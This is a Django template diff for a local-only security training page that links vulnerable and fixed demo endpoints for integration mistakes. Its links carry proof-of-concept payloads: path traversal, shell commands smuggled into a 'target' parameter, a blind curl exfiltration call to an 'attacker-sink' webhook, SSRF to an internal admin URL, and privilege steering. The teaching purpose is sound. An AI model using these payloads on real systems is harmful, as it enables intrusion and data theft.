@@ -1,0 +1,44 @@
+{% extends "demos/base.html" %}
+
+{% block content %}
+  <h1>Part 2: Integration Mistakes</h1>
+  <p>These local-only demos show what happens when backend input reaches filesystems, shell commands, outbound HTTP, delayed work, or privileged integrations.</p>
+
+  <h2>Path traversal / unsafe file access</h2>
+  <ul>
+    <li><a href="/part2/files/vulnerable/?name=alice-summary.txt">Vulnerable file read</a></li>
+    <li><a href="/part2/files/vulnerable/?name=../private/internal-note.txt">Traversal PoC</a></li>
+    <li><a href="/part2/files/fixed/?report=alice-summary">Fixed file read</a></li>
+  </ul>
+
+  <h2>Unsafe subprocess usage</h2>
+  <ul>
+    <li><a href="/part2/subprocess/vulnerable/?target=api">Vulnerable diagnostics</a></li>
+    <li><a href="/part2/subprocess/vulnerable/?target=api%3B%20id%20%23">Visible command injection PoC</a></li>
+    <li><a href="/part2/subprocess/blind/?target=api%3B%20curl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fpart2%2Fwebhooks%2Fattacker-sink%2F%3Fsource%3Dblind-rce%5C%26leak%3Ddemo%20%23">Blind webhook PoC</a></li>
+    <li><a href="/part2/webhooks/events/">Attacker webhook events</a></li>
+    <li><a href="/part2/subprocess/blind/?target=api%3B%20sleep%202%20%23">Blind timing PoC</a></li>
+    <li><a href="/part2/subprocess/fixed/?target=api%3B%20id%20%23">Fixed diagnostics</a></li>
+  </ul>
+
+  <h2>Unsafe outbound fetch / webhook validation</h2>
+  <ul>
+    <li><a href="/part2/fetch/vulnerable/?url=http://127.0.0.1:8000/part2/fetch/public-api/">Vulnerable public fetch</a></li>
+    <li><a href="/part2/fetch/vulnerable/?url=http://127.0.0.1:8000/part2/fetch/internal-admin/">SSRF PoC</a></li>
+    <li><a href="/part2/fetch/fixed/?url=http://127.0.0.1:8000/part2/fetch/internal-admin/">Fixed fetch</a></li>
+  </ul>
+
+  <h2>Unsafe background job / task parameters</h2>
+  <ul>
+    <li><a href="/part2/tasks/vulnerable/?action=export&document_id=1">Vulnerable export task</a></li>
+    <li><a href="/part2/tasks/vulnerable/?action=email_owner&document_id=2">Task parameter PoC</a></li>
+    <li><a href="/part2/tasks/fixed/?action=email_owner">Fixed task</a></li>
+  </ul>
+
+  <h2>Unsafe privileged integration</h2>
+  <ul>
+    <li><a href="/part2/privileged/vulnerable/?user=alice&target_user=alice&action=restart">Vulnerable allowed-looking action</a></li>
+    <li><a href="/part2/privileged/vulnerable/?user=alice&target_user=bob&action=snapshot">Privileged steering PoC</a></li>
+    <li><a href="/part2/privileged/fixed/?user=alice&action=snapshot">Fixed privileged action</a></li>
+  </ul>
+{% endblock %}
